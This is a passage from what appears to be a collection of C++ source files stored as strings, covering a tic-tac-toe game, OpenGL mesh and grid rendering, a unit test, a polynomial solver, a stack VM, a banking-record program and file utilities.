0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,\n  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88\n};\n\n#endif // HAS_GRAPHICAL_TFT\n",
    "#include <iostream>\n#include <limits>\n#include <cstdlib>\n#include <ctime>\n#include <chrono>\n#include <thread>\n#include <windows.h>  // Only include if you're on Windows\n\nusing namespace std;\n\nchar board[9] = { '1', '2', '3', '4', '5', '6', '7', '8', '9' };\nchar currentPlayer;\nstring player1, player2;\nbool singlePlayer = false;\n\n\n\n// Function to change console text color\nvoid setTextColor(int color) {\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    if (hConsole == INVALID_HANDLE_VALUE) {\n        cout << \"Error getting console handle\\n\";\n        return;\n    }\n    SetConsoleTextAttribute(hConsole, color);\n}\n\n// Display the game board with color highlights for 'X' (blue) and 'O' (red)\nvoid displayBoard() {\n    cout << '\\n';\n    for (int i = 0; i < 9; i++) {\n        if (board[i] == 'X') {\n            setTextColor(9);  // Blue for 'X'\n        }\n        else if (board[i] == 'O') {\n            setTextColor(12);  // Red for 'O'\n        }\n        else {\n            setTextColor(7);  // Default color for numbers\n        }\n        cout << \" \" << board[i];\n\n        if (i == 2 || i == 5) {\n            cout << '\\n' << \"---|---|---\" << '\\n';\n        }\n        else if (i != 8) {\n            cout << \" |\";\n        }\n    }\n    cout << '\\n';\n    setTextColor(7);  // Reset to default color\n}\n\n// Check if a player has won\nbool checkWin() {\n    int winConditions[8][3] = {\n        {0, 1, 2}, {3, 4, 5}, {6, 7, 8}, // Rows\n        {0, 3, 6}, {1, 4, 7}, {2, 5, 8}, // Columns\n        {0, 4, 8}, {2, 4, 6}             // Diagonals\n    };\n\n    for (int i = 0; i < 8; i++) {\n        if (board[winConditions[i][0]] == board[winConditions[i][1]] &&\n            board[winConditions[i][1]] == board[winConditions[i][2]]) {\n            return true;\n        }\n    }\n    return false;\n}\n\n// Check if the board is full (draw condition)\nbool checkDraw() {\n    for (int i = 0; i < 9; i++) {\n        if (board[i] != 'X' && board[i] != 'O') {\n            return false;\n        }\n    }\n    return true;\n}\n\n// Switch between players\nvoid switchPlayer() {\n    currentPlayer = (currentPlayer == 'X') ? 'O' : 'X';\n}\n\n// Validate the move and apply it\nbool makeMove(int position) {\n    if (position < 1 || position > 9 || board[position - 1] == 'X' || board[position - 1] == 'O') {\n        setTextColor(14);  // Yellow for invalid move warning\n        cout << \"Invalid move. Try again.\\n\";\n        setTextColor(7);   // Reset to default color\n        return false;\n    }\n    board[position - 1] = currentPlayer;\n    return true;\n}\n\n// Get valid integer input from user\nint getInput() {\n    int move;\n    while (true) {\n        setTextColor(10);  // Green for player input prompt\n        cout << \"Enter your move (1-9): \";\n        setTextColor(7);   // Reset to default color\n        if (cin >> move && move >= 1 && move <= 9) {\n            break;\n        }\n        else {\n            setTextColor(14);  // Yellow for invalid input warning\n            cout << \"Invalid input. Please enter a number between 1 and 9.\\n\";\n            setTextColor(7);   // Reset to default color\n            cin.clear();\n        }\n    }\n    return move;\n}\n\n// AI's move with random delay\nvoid aiMove() {\n    srand(time(0));  // Seed the random number generator\n\n    // Temporarily disable user input\n    cin.clear();  // Clear the error state\n\n    // Simulate AI \"thinking\" with a random delay\n    int waitTime = rand() % 3 + 1;  // Random time between 1 and 3 seconds\n    setTextColor(10);  // Green for AI thinking prompt\n    cout << \"AI is deciding...\\n\";\n    setTextColor(7);   // Reset to default color\n    this_thread::sleep_for(chrono::seconds(waitTime));  // Wait for the generated time\n\n    // AI chooses a random position\n    int move;\n    do {\n        move = rand() % 9 + 1;\n    } while (board[move - 1] == 'X' || board[move - 1] == 'O');\n\n    cout << \"AI chooses position: \" << move << '\\n';\n    board[move - 1] = currentPlayer;\n}\n// Initialize the game settings\nvoid initializeGame() {\n    setTextColor(10);  // Green for welcome message\n    cout << \"Welcome to Tic-Tac-Toe!\\n\";\n    setTextColor(7);   // Reset to default color\n    cout << \"Enter Player 1's name: \";\n    cin >> player1;\n    cout << \"Do you want to play against the AI? (y/n): \";\n    char choice;\n    cin >> choice;\n    if (choice == 'y' || choice == 'Y') {\n        singlePlayer = true;\n        player2 = \"AI\";\n    }\n    else {\n        cout << \"Enter Player 2's name: \";\n        cin >> player2;\n    }\n\n    currentPlayer = 'X';  // Player 1 always starts\n}\n\n// Reset the board\nvoid resetBoard() {\n    for (int i = 0; i < 9; i++) {\n        board[i] = '1' + i;\n    }\n}\n\n// Play the game\nvoid playGame() {\n    bool gameWon = false;\n    bool isDraw = false;\n\n    while (!gameWon && !isDraw) {\n        displayBoard();\n        if (currentPlayer == 'X') {\n            setTextColor(9);  // Blue for Player 1's turn\n            cout << player1 << \"'s turn (\" << currentPlayer << \")\\n\";\n        }\n        else {\n            setTextColor(12);  // Red for AI's turn\n   ",
    "#include \"CloudEngine/graphics/mesh.h\"\n#include \"CloudEngine/graphics/shader.h\"\n#include \"CloudEngine/graphics/texture.h\"\n#include \"CloudEngine/vec.h\"\n\n#include <glad/gl.h>\n\nvoid Mesh::Init()\n{\n    glGenVertexArrays(1, &vao);\n    glBindVertexArray(vao);\n\n    glGenBuffers(1, &vbo);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(fvec3),\n                 &vertices.front(), GL_STATIC_DRAW);\n\n    // TODO: May be slow the way i am doing it, but idk?\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 0, (void *)0);\n    glEnableVertexAttribArray(0);\n\n    if (!indices.empty())\n    {\n        glGenBuffers(1, &ubo);\n        glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, ubo);\n\n        glBufferData(GL_ELEMENT_ARRAY_BUFFER,\n                     indices.size() * sizeof(unsigned int), &indices.front(),\n                     GL_STATIC_DRAW);\n    }\n\n    if (!uvs.empty())\n    {\n        glGenBuffers(1, &tbo);\n        glBindBuffer(GL_ARRAY_BUFFER, tbo);\n\n        glBufferData(GL_ARRAY_BUFFER, uvs.size() * sizeof(fvec2), &uvs.front(),\n                     GL_STATIC_DRAW);\n\n        glVertexAttribPointer(1, 2, GL_FLOAT, GL_FALSE, 0, (void *)0);\n        glEnableVertexAttribArray(1);\n    }\n\n    if (!normals.empty())\n    {\n        glGenBuffers(1, &nbo);\n        glBindBuffer(GL_ARRAY_BUFFER, nbo);\n\n        glBufferData(GL_ARRAY_BUFFER, normals.size() * sizeof(fvec3), &normals.front(), GL_STATIC_DRAW);\n\n        glVertexAttribPointer(2, 3, GL_FLOAT, GL_FALSE, 0, (void *)0);\n        glEnableVertexAttribArray(2);\n    }\n\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\n    glBindVertexArray(0);\n}\n\nvoid Mesh::Draw(Shader &shader)\n{\n    int numDiffuse = -1;\n    int numSpecular = -1;\n    for (int i = 0; i < textures.size(); i++)\n    {\n        static int index = 0;\n\n        glActiveTexture(GL_TEXTURE0 + i);\n\n        Texture texture = textures.at(i);\n\n        std::string name;\n        if (texture.type == TextureType::DIFFUSE)\n        {\n            numDiffuse++;\n            name = \"diffuse\";\n        }\n\n        if (texture.type == TextureType::SPECULAR)\n        {\n            numSpecular++;\n            name = \"specular\";\n        }\n\n        shader.SetUniform(\"material.\" + name, i);\n\n        if (numDiffuse > -1)\n        {\n            // shader.SetUniform(\"material.diffuse\", i);\n            // shader.SetUniform(\"material.\" + name + \"[\" + std::to_string(numDiffuse) + \"]\", i);\n        }\n\n        if (numSpecular > -1)\n        {\n            // shader.SetUniform(\"material.specular\", i);\n        }\n\n        glBindTexture(GL_TEXTURE_2D, texture.id);\n    }\n    numDiffuse = -1;\n    numSpecular = -1;\n\n    glBindVertexArray(vao);\n\n    if (indices.empty())\n    {\n        glDrawArrays(GL_TRIANGLES, 0, vertices.size());\n    }\n    if (!indices.empty())\n    {\n        glDrawElements(GL_TRIANGLES, indices.size(), GL_UNSIGNED_INT, 0);\n    }\n\n    glBindVertexArray(0);\n    glActiveTexture(GL_TEXTURE0);\n}\n",
    "/*\n * cute_fms_cpf_createfile.cpp\n *\n *  Created on: Jan 26, 2011\n *      Author: esalves\n */\n\n#include \"cute_fms_cpf_createfile.h\"\n\n#include \"cute.h\"\n#include \"ide_listener.h\"\n#include \"cute_runner.h\"\n\n#include <ace/ACE.h>\n\n#include \"fms_cpf_types.h\"\n#include \"fms_cpf_file.h\"\n\nusing namespace ACE_OS;\n\nvoid CUTE_FMS_CPF_CreateFile::init_t1(){\n\n\tchar filename[10];\n\tACE_OS::memset(filename,0, sizeof(filename));\n\tACE_OS::strcpy(filename,\"afilename\");\n\n\tchar cpName[7];\n\tACE_OS::memset(cpName,0, sizeof(cpName));\n\tACE_OS::strcpy(cpName,\"CP1\");\n\n\tfile = new FMS_CPF_File(filename, cpName);\n\n}\n\nvoid CUTE_FMS_CPF_CreateFile::init_t2(){\n\tfile = new FMS_CPF_File();\n}\n\nvoid CUTE_FMS_CPF_CreateFile::copy_constr(){\n\tstatic FMS_CPF_File *tmp;\n\ttmp = new FMS_CPF_File();\n\n\tfile = new FMS_CPF_File(*tmp);\n\n\tASSERT_EQUALM(\"Copy constructor\", tmp, file);\n}\n\nvoid CUTE_FMS_CPF_CreateFile::destroy(){\n\t//Destruct object file.\n\tdelete file;\n//\tfile = 0;\n}\n\nvoid CUTE_FMS_CPF_CreateFile::create_t1(){\n\n\t//set attributes\n\tFMS_CPF_Types::fileAttributes fileAttr;\n\tfileAttr.ftype = FMS_CPF_Types::ft_REGULAR; //regular file\n\t//Record length = 100\n\t//simple file\n//\tfileAttr.regular = {100, false};\n\tfileAttr.regular.rlength = 100;\n\tfileAttr.regular.composite = false;\n\n\tchar volume[8];\n\tACE_OS::memset(volume,0, sizeof(volume));\n\tACE_OS::strcpy(volume,\"relvol\");\n\n\tFMS_CPF_Types::accessType access = FMS_CPF_Types::R_;\n\n\tbool compress = false;\n\n\tfile->create(fileAttr, volume, access, compress);\n\n\tASSERTM(\"Create file\", file->exists());\n}\n\nvoid CUTE_FMS_CPF_CreateFile::create_t2(){\n\n\tFMS_CPF_Types::accessType access = FMS_CPF_Types::R_W_;\n\tbool compress = true;\n\n\tfile->create(access, compress);\n\n\tASSERTM(\"Create file\", file->exists());\n}\n\nvoid CUTE_FMS_CPF_CreateFile::unreserve(){\n\n\tfile->unreserve();\n\n\tASSERTM(\"Reverse file\", file->isReserved());\n}\n\ncute::suite CUTE_FMS_CPF_CreateFile::makeFMSCPFCreateFileASuite_t1(){\n\n\tcute::suite s;\n\n\ts.push_back(CUTE(CUTE_FMS_CPF_CreateFile::create_t1));\n\ts.push_back(CUTE(CUTE_FMS_CPF_CreateFile::unreserve));\n\n\treturn s;\n\n}\ncute::suite CUTE_FMS_CPF_CreateFile::makeFMSCPFCreateFileASuite_t2(){\n\tcute::suite s;\n\n\ts.push_back(CUTE(CUTE_FMS_CPF_CreateFile::copy_constr));\n\ts.push_back(CUTE(CUTE_FMS_CPF_CreateFile::create_t2));\n\ts.push_back(CUTE(CUTE_FMS_CPF_CreateFile::unreserve));\n\n\treturn s;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <string>\n#include <cctype>\n\nusing namespace std;\n\nint baseToDecimal(string value, int base) {\n    int result = 0;\n    for (char digit : value) {\n        if (isdigit(digit)) {\n            result = result * base + (digit - '0');\n        } else {\n            result = result * base + (toupper(digit) - 'A' + 10);\n        }\n    }\n    return result;\n}\n\nvector<double> gaussianElimination(vector<vector<double>>& matrix) {\n    int n = matrix.size();\n\n    for (int i = 0; i < n; ++i) {\n        double diagElement = matrix[i][i];\n        if (diagElement == 0) {\n            cerr << \"Error: Matrix is singular or nearly singular\" << endl;\n            exit(1);\n        }\n        for (int j = 0; j <= n; ++j) {\n            matrix[i][j] /= diagElement;\n        }\n\n        for (int k = i + 1; k < n; ++k) {\n            double factor = matrix[k][i];\n            for (int j = 0; j <= n; ++j) {\n                matrix[k][j] -= factor * matrix[i][j];\n            }\n        }\n    }\n\n    vector<double> result(n);\n    for (int i = n - 1; i >= 0; --i) {\n        result[i] = matrix[i][n];\n        for (int j = i + 1; j < n; ++j) {\n            result[i] -= matrix[i][j] * result[j];\n        }\n    }\n\n    return result;\n}\n\nint main() {\n    int n, k;\n    cout << \"Enter number of points (n): \";\n    cin >> n;\n    cout << \"Enter minimum number of points to solve (k): \";\n    cin >> k;\n    \n    if (n < k) {\n        cerr << \"Error: Number of points must be at least equal to k\" << endl;\n        return 1;\n    }\n\n    vector<pair<int, int>> points;\n\n    for (int i = 0; i < n; ++i) {\n        int x, base;\n        string valueStr;\n        \n        cout << \"Enter x for point \" << i + 1 << \": \";\n        cin >> x;\n        cout << \"Enter base for y value (e.g., 10 for decimal, 16 for hexadecimal): \";\n        cin >> base;\n        cout << \"Enter y value as a string: \";\n        cin >> valueStr;\n\n        int y = baseToDecimal(valueStr, base);\n        points.push_back(make_pair(x, y));\n    }\n\n    vector<vector<double>> matrix(k, vector<double>(k + 1, 0));\n\n    for (int i = 0; i < k; ++i) {\n        int x = points[i].first;\n        int y = points[i].second;\n\n        for (int j = 0; j < k; ++j) {\n            matrix[i][j] = pow(x, k - 1 - j);\n        }\n        matrix[i][k] = y;\n    }\n\n    vector<double> coefficients = gaussianElimination(matrix);\n\n    cout << \"The polynomial coefficients are:\" << endl;\n    for (int i = 0; i < coefficients.size(); ++i) {\n        cout << \"a_\" << (k - 1 - i) << \" = \" << coefficients[i] << endl;\n    }\n\n    cout << \"The constant term (c) is: \" << coefficients[k - 1] << endl;\n\n    return 0;\n}\n",
    "#include <windows.h>\r\n#include <osg/NodeVisitor>\r\n\r\n#include \"raaAnimationPathCallback.h\"\r\n\r\nraaAnimationPathCallback::raaAnimationPathCallback(osg::AnimationPath* ap, double dSpeed) : osg::AnimationPathCallback(ap, 0.0, 1.0), m_dSpeed(dSpeed), m_bFirst(true), m_dTimeStep(0.0), m_dActualTime(0.0)\r\n{\r\n}\r\n\r\nraaAnimationPathCallback::~raaAnimationPathCallback()\r\n{\r\n}\r\n\r\ndouble raaAnimationPathCallback::getAnimationTime() const\r\n{\r\n\treturn m_dActualTime;\r\n}\r\n\r\nvoid raaAnimationPathCallback::operator()(osg::Node* node, osg::NodeVisitor* nv)\r\n{\r\n\tif(m_bFirst)\r\n\t{\r\n\t\tm_dLastTime = nv->getFrameStamp()->getSimulationTime();\r\n\t\tm_bFirst = false;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tdouble dTime = nv->getFrameStamp()->getSimulationTime();\r\n\t\tm_dTimeStep = (dTime - m_dLastTime) * m_dSpeed;\r\n\t\tif (!_pause)\r\n\t\t{\r\n\t\t\tm_dActualTime += m_dTimeStep;\r\n\t\t\tupdate(*node);\r\n\t\t}\r\n\t\tm_dLastTime = dTime;\r\n\t}\r\n\tNodeCallback::traverse(node, nv);\r\n\r\n}\r\n\r\ndouble raaAnimationPathCallback::getCurrentSpeed()\r\n{\r\n\treturn m_dSpeed;\r\n}\r\n\r\nvoid raaAnimationPathCallback::setCurrentSpeed(double dSpeed)\r\n{\r\n\tm_dSpeed = dSpeed;\r\n}\r\n\r\ndouble raaAnimationPathCallback::getLastTimeStep()\r\n{\r\n\treturn m_dTimeStep;\r\n}\r\n",
    "#include \"abstract-vm.hpp\"\n\nAbstractVM::AbstractVM() {}\n\nAbstractVM::~AbstractVM() {}\n\nvoid AbstractVM::exit(std::shared_ptr<const IOperand> operand) {\n  (void)operand;\n  std::exit(0);\n}\n\nvoid AbstractVM::push(std::shared_ptr<const IOperand> operand) { _stack.push(operand); }\n\nvoid AbstractVM::print(std::shared_ptr<const IOperand> operand) {\n  (void)operand;\n  if (_stack.empty()) {\n    throw std::runtime_error(\"Stack is empty\");\n  }\n\n  auto top = _stack.top();\n  if (top->getType() != eOperandType::Int8) {\n    throw std::runtime_error(\"Expected Int8\");\n  }\n\n  std::cout << top->toString() << std::endl;\n}\n\nvoid AbstractVM::add(std::shared_ptr<const IOperand> operand) {\n  (void)operand;\n  if (_stack.size() < 2) {\n    throw std::runtime_error(\"Stack has less than 2 elements\");\n  }\n\n  auto rhs = _stack.top();\n  _stack.pop();\n  auto lhs = _stack.top();\n  _stack.pop();\n\n  auto result = (*lhs) + (*rhs);\n  _stack.push(result);\n}\n\nvoid AbstractVM::execute(const std::vector<Instruction> &instructions) {\n\n  for (const auto &instr : instructions) {\n    auto op = instr.getOp();\n\n    std::map<std::string, void (AbstractVM::*)(std::shared_ptr<const IOperand>)> ops = {\n        {\"push\", &AbstractVM::push},\n        {\"print\", &AbstractVM::print},\n        {\"add\", &AbstractVM::add},\n        {\"exit\", &AbstractVM::exit},\n        // {\"pop\", &AbstractVM::pop},\n        // {\"dump\", &AbstractVM::dump},\n        // {\"assert\", &AbstractVM::assert},\n        // {\"sub\", &AbstractVM::sub},\n        // {\"mul\", &AbstractVM::mul},\n        // {\"div\", &AbstractVM::div},\n        // {\"mod\", &AbstractVM::mod},\n    };\n\n    if (ops.find(op) == ops.end()) {\n      throw std::runtime_error(\"Unknown operation\");\n    }\n\n    auto operand = instr.getOperand();\n    (this->*ops[op])(operand);\n  }\n}",
    "//Banking Record System , C++ Project by Abhisht. \r\n#include <iostream>\r\n\r\n#include <fstream>\r\n\r\n#include <cctype>\r\n\r\n#include <iomanip>\r\n\r\n#include <string>\r\nusing namespace std;\r\n\r\n//---------------------------------------------------------------------------------------------------//\r\n\r\nconst int maxName = 50;\r\nconst int maxMoney = 7;\r\nconst int maxNumber = 12;\r\nconst int typeSize = 4;\r\nconst string sep = \" |\";\r\nconst int totalLen = maxName + maxNumber + typeSize + maxMoney + sep.size() * 4;\r\nconst string sepLine = sep + string(totalLen - 1, '=') + '|';\r\n\r\nclass Bank {\r\n    private:\r\n        unsigned long long account_number;\r\n\t\tchar holder_name[51];\r\n\t\tint deposit;\r\n\t\tchar type;\r\n    public:\r\n\r\n        void System_clear();\r\n\t\tvoid Get_Data();\r\n\t\tvoid Write_Data();\r\n\t\tvoid deposit_withdraw(int n, int option);\r\n\t\tvoid Display_Invidual_Records(unsigned long long n);\r\n\t\tvoid report() const;\r\n\t\tvoid Show_account() const; //TO DISPLAY ACCOUNT DETAILS\r\n\t\tvoid dep(int); //TO ADD IN DEPOSIT     \r\n\t\tvoid draw(int x); //TO SUBTRACT FROM DEPOSIT\r\n\t\tunsigned long long retacno() const; //function to return account number\r\n\t\tint retdeposit() const; //function to return balance amount\r\n\t\tchar rettype() const; //TO WITHDRAW FROM DEPOSIT\t\t\t\r\n\t\tvoid Modification_data();\r\n};\r\n\r\nvoid Bank::Get_Data() {\r\n    cout << \"\\n\\n===========CREATE BANK ACCOUNT===========\\n\\n\";\r\n    cout << \"\\nEnter the Account Number:\";\r\n\tcin >> account_number;\r\n\twhile ((int)to_string(account_number).size() != 12)  // Restrict account number to be of 12 digits\r\n\t{\r\n\t\tcout << \"The account number has to be of 12 digits. Please try again.\\n\";\r\n\t\tcin.clear();    // Chances of unwanted newline in the buffer\r\n\t\tfflush(stdin);\r\n\t\tcin >> account_number;\r\n\t}\r\n    cout << \"\\n\\nEnter Account Holder Name: \";\r\n    cin.clear();\r\n\tfflush(stdin);\r\n    cin.getline(holder_name, 51);\r\n    cout << \"\\nWhich type of Account \\n[S for Saving Account] (or)[C for Current Account]: \";\r\n\tcin.clear();\r\n\tfflush(stdin);\r\n    cin >> type;\r\n    type = toupper(type);\r\n    while (type != 'S' && type != 'C') {\r\n        cout << \"Please enter either S or C to avoid data corruption: \";\r\n\t\tcin.clear();\r\n\t\tfflush(stdin);\r\n        cin >> type;\r\n        type = toupper(type);\r\n    }\r\n    if (type == 'S') {\r\n        cout << \"\\nEnter the Initial Amount for Saving Account [Minimum 500/-]: \";\r\n        cin >> deposit;\r\n\t\twhile (deposit >= 1000000)\r\n\t\t{\r\n\t\t\tcout << \"Maximum money is 1000000/-\\nPlease try again: \";\r\n\t\t\tcin >> deposit;\r\n\t\t}\r\n        cout << \"\\n\\nAccount has been Created Sucessfully.\";\r\n    } else if (type == 'C') {\r\n        cout << \"\\nEnter the Initial Amount for Current Account [Minimum 1000/-]: \";\r\n        cin >> deposit;\r\n\t\twhile (deposit >= 1000000)\r\n\t\t{\r\n\t\t\tcout << \"Maximum money is 1000000/-\\nPlease try again: \";\r\n\t\t\tcin >> deposit;\r\n\t\t}\r\n        cout << \"\\n\\nAccount has been Created Sucessfully.\";\r\n    }\r\n}\r\n\r\nvoid Bank::Write_Data() {\r\n    ofstream outFile;\r\n    outFile.open(\"account.dat\", ios::binary | ios::app);\r\n    Get_Data();\r\n    outFile.write((char * ) this, sizeof( * this));\r\n    outFile.close();\r\n}\r\n\r\nvoid Bank::Modification_data() {\r\n    cout << \"\\nAccount No: \" << account_number;\r\n    cout << \"\\nModify Account Holder Name: \";\r\n    cin.clear();\r\n\tfflush(stdin);\r\n    cin.getline(holder_name, 51);\r\n    cout << \"\\nModify Type of Account : \";\r\n\tcin.clear();\r\n\tfflush(stdin);\r\n    cin >> type;\r\n    type = toupper(type);\r\n    cout << \"\\nModify Total Balance Amount : \";\r\n    cin >> deposit;\r\n\twhile (deposit >= 1000000)\r\n\t{\r\n\t\t\tcout << \"Maximum money is 1000000/-\\nPlease try again: \";\r\n\t\t\tcin >> deposit;\r\n\t}\r\n}\r\n\r\nvoid Bank::Display_Invidual_Records(unsigned long long n) {\r\n    bool flag = false;\r\n    ifstream inFile;\r\n    inFile.open(\"account.dat\", ios::binary);\r\n    if (!inFile) {\r\n        cout << \"\\n\\nAn Error Occurred. Please try again.\";\r\n        return;\r\n    }\r\n    cout << \"\\nBALANCE DETAILS\\n\";\r\n\r\n    while (inFile.read((char * ) this, sizeof( * this))) {\r\n        if (retacno() == n) {\r\n            Show_account();\r\n            flag = true;\r\n        }\r\n    }\r\n    inFile.close();\r\n    if (flag == false)\r\n        cout << \"\\n\\nAccounts Details not Found.\";\r\n}\r\n\r\nvoid Bank::report() const {\r\n    cout << sep <<\r\n        setw(maxNumber) << account_number << sep <<\r\n        setw(maxName) << holder_name << sep <<\r\n        setw(typeSize) << type << sep <<\r\n        setw(maxMoney) << deposit << sep << endl << sepLine << endl;\r\n}\r\n\r\nvoid Bank::dep(int x) {\r\n    deposit = deposit + x;\r\n}\r\n\r\nvoid Bank::draw(int x) {\r\n    deposit -= x;\r\n}\r\n\r\nvoid Bank::Show_account() const {\r\n    cout << \"\\nAccount No: \" << account_number;\r\n    cout << \"\\nAccount Holder Name: \";\r\n    cout << holder_name;\r\n    if (type == 'S') {\r\n        cout << \"\\nType of Account: Saving \";\r\n    } else {\r\n        cout << \"\\nType of Account: Current \";\r\n    }\r\n    cout << \"\\nTotal Balance: \" << deposit;\r\n}\r\n\r\nunsigned long long Bank::retacno() const{\r\n    return account_number;\r\n}\r\n\r\nint Bank::retdeposit() const {\r\n    ",
    "#include <InputSystem/Input.h>\n#include <Grid/Grid.h>\n\n#include <gtc/matrix_transform.hpp>\n\n\nGrid::Grid()\n{\n\tconst auto size = 10;\n\tconst auto quadrants = 4;\n\tconst auto verticesPerLine = 2;\n\n\tconst auto bytesPerLineVertex = verticesPerLine * static_cast<GLuint>(Buffer::ComponentType::CT_XYZ) * sizeof(GLint);\n\tconst auto bytesPerLineColor = verticesPerLine * static_cast<GLuint>(Buffer::ComponentType::CT_RGBA) * sizeof(GLfloat);\n\n\tconst auto bytesVertexVBO = (size + 1)  * quadrants * bytesPerLineVertex;\n\tconst auto bytesColorVBO = (size + 1) * quadrants * bytesPerLineColor;\n\n\tm_buffer.CreateBuffer((size + 1) * quadrants * verticesPerLine, false);\n\n\tm_buffer.FillVBO(Buffer::VBOType::VBOT_VertexBuffer, (GLint*)nullptr, bytesVertexVBO, Buffer::FillType::FT_Multiple);\n\tm_buffer.FillVBO(Buffer::VBOType::VBOT_ColorBuffer, (GLfloat*)nullptr, bytesColorVBO, Buffer::FillType::FT_Multiple);\n\n\tauto offsetColor = 0U;\n\tauto offsetVertex = 0U;\n\n\n\tfor (int i = 0; i <= size; i++)\n\t{\n\t\tGLint vertices[] = { -size + i, 0,  size,\n\t\t\t\t\t\t\t -size + i, 0, -size };\n\n\t\tGLfloat colors[] = { 0.5f, 0.5f, 0.5f, 1.0f,\n\t\t\t\t\t\t\t 0.5f, 0.5f, 0.5f, 1.0f };\n\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_VertexBuffer, vertices, sizeof(vertices), offsetVertex);\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_ColorBuffer, colors, sizeof(colors), offsetColor);\n\n\t\toffsetVertex += bytesPerLineVertex;\n\t\toffsetColor += bytesPerLineColor;\n\t}\n\n\tfor (int i = 1; i < size + 1; i++)\n\t{\n\t\tGLint vertices[] = { 0 + i, 0,  size,\n\t\t\t\t\t\t\t 0 + i, 0, -size };\n\n\t\tGLfloat colors[] = { 0.5f, 0.5f, 0.5f, 1.0f,\n\t\t\t\t\t\t\t 0.5f, 0.5f, 0.5f, 1.0f };\n\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_VertexBuffer, vertices, sizeof(vertices), offsetVertex);\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_ColorBuffer, colors, sizeof(colors), offsetColor);\n\n\t\toffsetVertex += bytesPerLineVertex;\n\t\toffsetColor += bytesPerLineColor;\n\t}\n\n\tfor (int i = 0; i <= size; i++)\n\t{\n\t\tGLint vertices[] = { -size, 0, -size + i,\n\t\t\t\t\t\t\t  size, 0, -size + i };\n\n\t\tGLfloat colors[] = { 0.5f, 0.5f, 0.5f, 1.0f,\n\t\t\t\t\t\t\t 0.5f, 0.5f, 0.5f, 1.0f };\n\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_VertexBuffer, vertices, sizeof(vertices), offsetVertex);\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_ColorBuffer, colors, sizeof(colors), offsetColor);\n\n\t\toffsetVertex += bytesPerLineVertex;\n\t\toffsetColor += bytesPerLineColor;\n\t}\n\n\tfor (int i = 1; i < size + 1; i++)\n\t{\n\t\tGLint vertices[] = { -size, 0, 0 + i,\n\t\t\t\t\t\t\t  size, 0, 0 + i };\n\n\t\tGLfloat colors[] = { 0.5f, 0.5f, 0.5f, 1.0f,\n\t\t\t\t\t\t\t 0.5f, 0.5f, 0.5f, 1.0f };\n\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_VertexBuffer, vertices, sizeof(vertices), offsetVertex);\n\t\tm_buffer.AppendVBO(Buffer::VBOType::VBOT_ColorBuffer, colors, sizeof(colors), offsetColor);\n\n\t\toffsetVertex += bytesPerLineVertex;\n\t\toffsetColor += bytesPerLineColor;\n\t}\n\n\tm_position = glm::vec3(0.0f);\n\tm_rotation = glm::vec3(0.0f);\n}\n\nvoid Grid::Render(const Shader& shader)\n{\n\tshader.SendUniformData(\"model\", m_transform.GetMatrix());\n\tshader.SendUniformData(\"isTextured\", false);\n\n\tm_buffer.LinkVBO(shader, \"vertexIn\", Buffer::VBOType::VBOT_VertexBuffer, Buffer::ComponentType::CT_XYZ, Buffer::DataType::DT_Int);\n\tm_buffer.LinkVBO(shader, \"colorIn\", Buffer::VBOType::VBOT_ColorBuffer, Buffer::ComponentType::CT_RGBA, Buffer::DataType::DT_Float);\n\n\tm_buffer.Render(Buffer::DrawType::DwT_Lines);\n}\n\nvoid Grid::MoveGrid(Grid& grid)\n{\n\tif (Input::Instance()->IsLeftButtonClicked())\n\t{\n\t\tauto rotation = grid.GetTransform().GetRotation();\n\t\trotation.x += Input::Instance()->GetMouseMotionY();\n\t\trotation.y += Input::Instance()->GetMouseMotionX();\n\t\tgrid.GetTransform().SetRotation(rotation.x, rotation.y, rotation.z);\n\t}\n}\n\nTransform& Grid::GetTransform()\n{\n\treturn m_transform;\n}\n",
    "/**\n * Copyright L. Spiro 2024\n *\n * Written by: Shawn (L. Spiro) Wilcoxen\n *\n * Description: The base class for working with files.\n */\n\n\n#include \"PWFileBase.h\"\n#include \"../OS/PWOs.h\"\n\nnamespace pw {\n\n\tCFileBase::~CFileBase() {}\n\n\t// == Functions.\n\t/**\n\t * Opens a file.  The path is given in UTF-8.\n\t *\n\t * \\param _pcPath Path to the file to open.\n\t * \\return Returns true if the file was opened, false otherwise.\n\t */\n\tbool CFileBase::Open( const char8_t * _pcFile ) {\n\t\tbool bErrored;\n\t\tstd::u16string swTmp = CUtilities::Utf8ToUtf16( _pcFile, &bErrored );\n\t\tif ( bErrored ) { return false; }\n\t\treturn Open( swTmp.c_str() );\n\t}\n\n\t/**\n\t * Opens a file.  The path is given in UTF-16.\n\t *\n\t * \\param _pcPath Path to the file to open.\n\t * \\return Returns true if the file was opened, false otherwise.\n\t */\n\tbool CFileBase::Open( const char16_t * _pcFile ) {\n\t\tbool bErrored;\n\t\tstd::u8string sTmp = CUtilities::Utf16ToUtf8( _pcFile, &bErrored );\n\t\tif ( bErrored ) { return false; }\n\t\treturn Open( sTmp.c_str() );\n\t}\n\n\t/**\n\t * Creates a file.  The path is given in UTF-8.\n\t *\n\t * \\param _pcPath Path to the file to create.\n\t * \\return Returns true if the file was created, false otherwise.\n\t 